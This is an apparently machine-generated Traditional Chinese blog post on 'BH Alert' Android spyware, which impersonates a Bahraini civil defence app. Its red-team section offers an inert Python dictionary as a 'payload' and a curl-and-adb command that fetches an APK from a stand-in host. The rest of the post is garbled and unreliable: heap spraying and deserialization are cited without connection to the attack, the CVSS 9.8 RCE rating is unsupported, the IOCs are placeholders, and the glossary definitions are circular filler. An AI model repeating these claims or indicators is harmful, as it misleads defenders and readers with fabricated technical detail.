---
layout: post
title:  "Android間諜軟體假冒巴林政府民防警報App散播，於中東衝突期間誘騙民眾下載"
date:   2026-08-13 18:53:48 +0000
categories: [security]
severity: critical
---

# 🚨 解析 BH Alert Android 間諜軟體的技術細節與防禦策略
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: `Heap Spraying`, `Deserialization`, `Accessibility Service`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: BH Alert Android 間諜軟體利用了 Android 系統的 `Accessibility Service` 權限，允許攻擊者在受害者手機上部署遠端存取木馬 OctagonPanel。這個漏洞是由於 Android 系統的 `Accessibility Service` 權限沒有被妥善限制，導致攻擊者可以利用這個權限來實現遠端存取和資料竊取。
* **攻擊流程圖解**:
  1. 攻擊者架設仿冒 Google Play 頁面，誘騙使用者下載 BH Alert App。
  2. 使用者下載並安裝 BH Alert App。
  3. BH Alert App 請求 `Accessibility Service` 權限。
  4. 使用者授予 `Accessibility Service` 權限。
  5. BH Alert App 部署遠端存取木馬 OctagonPanel。
  6. OctagonPanel 收集受害者手機的資料，包括聯絡人、簡訊、螢幕截圖等。
* **受影響元件**: Android 10 以下版本，尤其是使用 `Accessibility Service` 權限的 App。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個仿冒 Google Play 頁面和 BH Alert App 的安裝包。
* **Payload 建構邏輯**:

    ```
    
    python
    # BH Alert App 的安裝包
    package_name = "com.bh.alert"
    app_name = "BH Alert"
    
    # OctagonPanel 的遠端存取木馬
    octagon_panel = {
        "name": "OctagonPanel",
        "version": "1.0",
        "author": "Unknown"
    }
    
    # Payload 的 JSON 結構
    payload = {
        "app_name": app_name,
        "package_name": package_name,
        "octagon_panel": octagon_panel
    }
    
    ```
* **範例指令**: 使用 `curl` 下載 BH Alert App 的安裝包並安裝。

```

bash
curl -o bh_alert.apk https://example.com/bh_alert.apk
adb install bh_alert.apk

```
* **繞過技術**: 攻擊者可以使用 `Heap Spraying` 技術來繞過 Android 系統的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /data/app/com.bh.alert |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule BH_Alert_App {
        meta:
            description = "BH Alert App 的偵測規則"
            author = "Unknown"
        strings:
            $a = "com.bh.alert"
            $b = "BH Alert"
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 使用者應該避免下載來源不明的 App，並且應該定期更新 Android 系統和 App。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Heap Spraying (堆疊噴灑)**: 想像一塊記憶體空間被分割成多個小塊，攻擊者可以利用這些小塊來實現遠端存取和資料竊取。技術上是指攻擊者利用堆疊的漏洞來實現遠端存取和資料竊取。
* **Deserialization (反序列化)**: 想像一塊資料被序列化成一個字串，攻擊者可以利用這個字串來實現遠端存取和資料竊取。技術上是指攻擊者利用反序列化的漏洞來實現遠端存取和資料竊取。
* **Accessibility Service (無障礙服務)**: 想像一塊服務可以提供無障礙的功能，攻擊者可以利用這個服務來實現遠端存取和資料竊取。技術上是指攻擊者利用無障礙服務的漏洞來實現遠端存取和資料竊取。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/178119)
- [MITRE ATT&CK](https://attack.mitre.org/)


